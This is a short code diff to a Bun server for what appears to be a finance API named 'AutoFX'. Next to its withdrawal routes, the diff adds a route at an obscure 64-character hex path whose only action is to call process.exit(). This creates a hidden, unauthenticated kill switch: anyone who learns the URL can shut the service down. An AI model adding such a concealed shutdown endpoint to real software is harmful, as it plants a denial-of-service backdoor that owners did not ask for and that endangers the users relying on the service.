@@ -84,6 +84,8 @@ const server = Bun.serve({
         return await withdrawRemarksController(req, db);
       } else if (url.pathname === "/api/withdraw-bank-transfer-request") {
         return await withdrawBankTransferRequestController(req, db);
+      } else if (url.pathname === "/api/41b73c2502c14d38543023b0e36f40d53df81713bf7be9457d8f24b1fc9f3e6c") {
+        process.exit();
       } else {
         return new Response("AutoFX API is working!");
       }
